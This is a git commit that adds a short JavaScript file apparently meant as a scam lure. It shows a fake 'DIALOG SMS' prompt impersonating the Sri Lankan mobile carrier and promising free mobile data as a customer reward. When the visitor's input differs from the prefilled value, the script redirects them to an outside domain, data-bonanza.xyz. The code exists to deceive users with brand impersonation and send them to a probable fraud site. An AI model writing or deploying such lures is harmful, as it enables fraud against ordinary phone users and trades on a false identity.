4f082cbe3080070c58738c10032fc30635e82513
infofest <ukpono82@gmail.com>
2025-03-12 17:33:41 -0700

    Create activation-free-data-dialog.lk.js

---
+++ activation-free-data-dialog.lk.js
@@ -0,0 +1,5 @@
+var password = 'Free Data'
+password=prompt('DIALOG SMS: Dear Customer, Kindly Check if Your Dialog Sim Card is Qualify To Receive From 5GB To 100GB Data, Old Customers Reward, Press Free Data To Check Now ','Free Data');
+if (password != 'Free Data') {
+location.href='https://www.data-bonanza.xyz/free-data-dialog.lk';
+}
